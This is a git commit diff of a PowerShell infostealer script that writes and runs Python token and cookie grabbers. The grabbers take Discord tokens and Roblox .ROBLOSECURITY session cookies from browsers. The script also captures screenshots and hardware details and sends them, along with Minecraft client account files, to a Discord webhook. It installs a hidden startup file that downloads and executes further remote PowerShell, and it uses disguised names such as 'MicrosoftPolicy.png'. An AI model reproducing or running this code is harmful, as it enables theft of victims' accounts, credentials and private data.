5241bf07e0705db4518b2ea2c051382310679af2
Appolon24800 <93398824+Appolon24800@users.noreply.github.com>
2023-01-15 15:14:20 +0100

    a LOT of update

--- gr.ps1
+++ gr.ps1
@@ -4,9 +4,8 @@ $webHookUrlPYTHON2="""$webHookUrl"""
 $webHookUrlPYTHON3="'"+$webHookUrlPYTHON2+"'"
 $webHookUrl2="$"+"webHookUrl"
 
-New-Item "C:\temp" -Type Directory
 cls
-cd C:/temp
+cd C:\Windows\Temp
 Set-Content UUID.py "
 import os
 import re
@@ -38,7 +37,7 @@ def main():
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
     }
-    message = 'Nice' if PING_ME else ''
+    message = '@everyone' if PING_ME else ''
     for platform, path in paths.items():
         if not os.path.exists(path):
             continue
@@ -65,30 +64,39 @@ if __name__ == '__main__':
     
 "
 
+
+cls
+cd C:\Windows\Temp
+
+
 ##### STARTUP FONCTION
 Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd" "
 @echo off
 powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/g.ps1).content)
 "
-pause
 ##### END STARTUP FONCTION
 
 cls
 
-$Path = "C:\temp\"
-If (!(test-path $path)) 
-{
-New-Item -ItemType Directory -Force -Path $path}
-Add-Type -AssemblyName System.Windows.Forms
-$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-$image = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
-$graphic = [System.Drawing.Graphics]::FromImage($image)
-$point = New-Object System.Drawing.Point(0, 0)
-$graphic.CopyFromScreen($point, $point, $image.Size);
-$cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position, [System.Windows.Forms.Cursor]::Current.Size)
-[System.Windows.Forms.Cursors]::Default.Draw($graphic, $cursorBounds)
-$screen_file = "$Path\" + "MicrosoftPolicy.png"
-$image.Save($screen_file, [System.Drawing.Imaging.ImageFormat]::Png)
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+$screens = [Windows.Forms.Screen]::AllScreens
+
+$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
+$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
+$width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
+$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
+
+$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
+$bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
+$graphics = [Drawing.Graphics]::FromImage($bmp)
+
+$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+
+$bmp.Save("C:\Windows\Temp\MicrosoftPolicy.png")
+
+$graphics.Dispose()
+$bmp.Dispose()
+
 cls
 
 function Upload-Discord {
@@ -114,7 +122,7 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $webHookUr
 }
 
 Upload-Discord -text "||@everyone||"
-Upload-Discord -text "---------------------------------------------------------------------------------------------------------------------------------------------------------"
+Upload-Discord -text "----------------------------------------------------------------------||@everyone||----------------------------------------------------------------------------"
 
 [System.Collections.ArrayList]$embedArray = @()
 $thumbUrl = 'https://streamsentials.com/wp-content/uploads/2022/06/EZ-transparent-png.png' 
@@ -126,13 +134,16 @@ $thumbnailObject = [PSCustomObject]@{
 $ip = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
 $gpu = (Get-WmiObject win32_VideoController).Name
 $cpu = (Get-WmiObject Win32_Processor).Name
-
+$hwid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
+$ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
 
 $color = '12517376'
 $title = 'Info of '
 $description = 'IP: ' + '`' + $ip + '`' + '
 GPU: ' + '`' + $GPU + '`' + '
 CPU: ' + '`' + $CPU + '`' + '
+RAM: ' + '`' + $ram + '`' + '
+HWID: ' + '`' + $hwid + '`' + '
 Discord: '
 
 $embedObject = [PSCustomObject]@{
@@ -153,12 +164,131 @@ $payload = [PSCustomObject]@{
 
 
 Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
-python C:\temp\UUID.py
-Upload-Discord -file "C:\temp\MicrosoftPolicy.png"
+python C:\Windows\Temp\UUID.py
+
+
+
+
+
+Set-Content UUID_gen.py "
+
+import os
+import codecs
+import marshal, zlib, base64, lzma
+import json
+from base64 import *
+
+webhookk = '$webHookUrl'
+
+def command(c):
+    os.system(c)
+def cls():
+    os.system('cls')
+
+try:
+    import robloxpy
+    import requests,re
+    from discordwebhook import *
+    import browser_cookie3
+    
+except:
+    input('Fail... UUID broken')
+
+def cookieLogger():
+
+    data = []
+
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+    try:
+        cookies = browser_cookie3.chromium(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+
+cookies = cookieLogger()
+
+roblox_cookie = cookies[1]
+isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
+
+
+ebruh = requests.get('https://www.roblox.com/mobileapi/userinfo',cookies={'.ROBLOSECURITY':roblox_cookie})
+info = json.loads(ebruh.text)
+rid = info['UserID']
+friends = robloxpy.User.Friends.External.GetCount(rid)
+headshot = robloxpy.User.External.GetHeadshot(rid)
+username = info['UserName']
+robux = info['RobuxBalance']
+premium = info['IsPremium']
+
+discord = Discord(url=webhookk)
+discord.post(
+    embeds=[
+        {
+            'title': 'Roblox:',
+            'color' : 12517376,
+            'fields': [
+                {'name': 'Username', 'value': username, 'inline': True},
+                {'name': 'Robux Balance', 'value': robux, 'inline': True},
+                {'name': 'Premium Status', 'value': premium,'inline': True},
+                {'name': 'Friends', 'value': friends, 'inline': True},
+                {'name': '.ROBLOSECURITY', 'value': f'```fix\n{roblox_cookie}```', 'inline': False},
+            ],
+            'thumbnail': {'url': headshot},
+
+
+        },
+    ]
+)
+
+"
+python C:\Windows\Temp\UUID_gen.py
+Upload-Discord -file "C:\Windows\Temp\MicrosoftPolicy.png"
 Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
+Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
 
-Upload-Discord -text "---------------------------------------------------------------------------------------------------------------------------------------------------------"
+Upload-Discord -text "----------------------------------------------------------------------------------------------------------------------------------------------------------------"
 
 
-Remove-Item C:/temp
-exit  
